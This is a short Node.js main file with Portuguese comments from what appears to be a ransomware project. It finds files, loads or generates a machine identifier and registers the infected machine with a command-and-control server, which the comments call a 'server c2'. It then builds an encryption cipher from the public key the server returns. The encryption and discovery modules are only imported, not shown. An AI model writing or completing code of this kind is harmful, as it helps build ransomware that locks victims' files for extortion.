const discovery = require("./discovery"); // file discover
const worker = require("./sync"); // processo que executa operações de encriptação
const loadMachineID = require("./utils/loadId"); // carrega a identificação da máquina
const generateMachineID = require("./utils/generateId"); // gera a identificação da máquina
const connection = require("./utils/connection"); // gerencia a conexão com o server c2
const Encrypter = require("./Ciphers/Crypter");

// busca a identificação da máquina ou gera uma nova
var sysInfo = loadMachineID();
if (!sysInfo) {
  // é a primeira vez que rodou nesta máquina
  sysInfo = generateMachineID();
}
connection.registerMachine(sysInfo, function({ publicKey }) {
  const cipher = Encrypter(publicKey);
});
